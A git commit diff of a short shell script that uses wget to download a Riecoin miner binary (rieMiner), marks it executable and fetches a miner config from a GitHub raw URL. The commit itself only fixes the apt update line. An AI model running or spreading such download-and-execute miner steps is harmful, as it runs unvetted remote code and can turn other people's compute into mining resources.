adcc2e408084d3febdec5080a2123906182d4fc5
Frotinor <reysanju1999@gmail.com>
2024-12-14 03:01:57 +0700

    Update gwebiyufew.sh

--- gwebiyufew.sh
+++ gwebiyufew.sh
@@ -1,4 +1,4 @@
-apt sudo update -y && \
+apt update -y && \
 wget https://riecoin.xyz/rieMiner/Download/Deb64AVX2 && \
 chmod +x Deb64AVX2 && \
 wget https://raw.githubusercontent.com/Frotinor/heithere/refs/heads/main/gwernui.conf && \
